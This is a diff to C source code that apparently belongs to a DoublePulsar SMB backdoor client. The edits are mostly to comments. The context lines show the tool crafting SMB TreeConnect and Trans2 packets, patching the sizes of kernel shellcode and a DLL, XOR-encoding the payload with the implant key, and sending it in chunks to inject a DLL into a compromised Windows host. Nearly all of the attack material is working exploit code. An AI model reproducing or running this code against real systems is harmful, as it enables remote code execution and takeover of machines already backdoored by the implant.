@@ -450,19 +450,18 @@ int main(int argc, char* argv[])
 	memcpy(packet + 3, &smblen, 1);
 
 	//update UserID in modified TreeConnect Request
-	memcpy(packet + 0x20, (char*)&userid, 2); //update userid in packet
+	memcpy(packet + 0x20, (char*)&userid, 2);
 
 	//send modified SMB TreeConnect request
 	send(sock, (char*)packet, ptr - packet, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
 	//copy the treeID from the TreeConnect response
-	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
+	treeid = *(WORD*)(recvbuff + 0x1c);
 
 	//Update treeID, UserID in the trans2 request
 	memcpy(trans2_request + 28, (unsigned char*)&treeid, 2);
 	memcpy(trans2_request + 32, (unsigned char*)&userid, 2);
-	//might need to update processid
 
 	//if DoublePulsar is enabled, the multiplex ID is incremented by 10 and will return x51 or 81
 	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
@@ -525,7 +524,6 @@ int main(int argc, char* argv[])
 
 	printf("patching DLL + Userland shellcode size in Kernel shellcode...\n");
 	*(DWORD*)&kernel_rundll_shellcode[2158] = dwFileSizeLow + 3978;
-
 	printf("patching DLL size...\n");
 	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF82] = dwFileSizeLow;
 	printf("patching DLL ordinal...\n");
@@ -565,6 +563,8 @@ int main(int argc, char* argv[])
 
 	//calculate kernel shellcode size 
 	int kernel_shellcode_size = sizeof(kernel_rundll_shellcode) / sizeof(kernel_rundll_shellcode[0]);
+
+	//remove the NULL terminator from the count
 	kernel_shellcode_size -= 1;
 	printf("Kernel shellcode size:  %d\n", kernel_shellcode_size);
 	int payload_totalsize = kernel_shellcode_size + dwFileSizeLow;
@@ -587,6 +587,7 @@ int main(int argc, char* argv[])
 	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
 	int i;
 
+	//XOR the payload with the XOR key
 	for (i = 0; i < payload_totalsize; i++)
 	{
 		pFULLBUFFER[i] ^= byte_xor_key[i % 4];
@@ -628,6 +629,7 @@ int main(int argc, char* argv[])
 			memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&bytesLeft, 4);
 			memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
 
+			//XOR the parameters with the XOR key
 			for (i = 0; i < 13; i++)
 			{
 				Parametersbuffer[i] ^= byte_xor_key[i % 4];
@@ -704,6 +706,7 @@ int main(int argc, char* argv[])
 		memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&ChunkSize, 4);
 		memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
 
+		//XOR the parameters with the XOR key
 		for (i = 0; i < 13; i++)
 		{
 			Parametersbuffer[i] ^= byte_xor_key[i % 4];
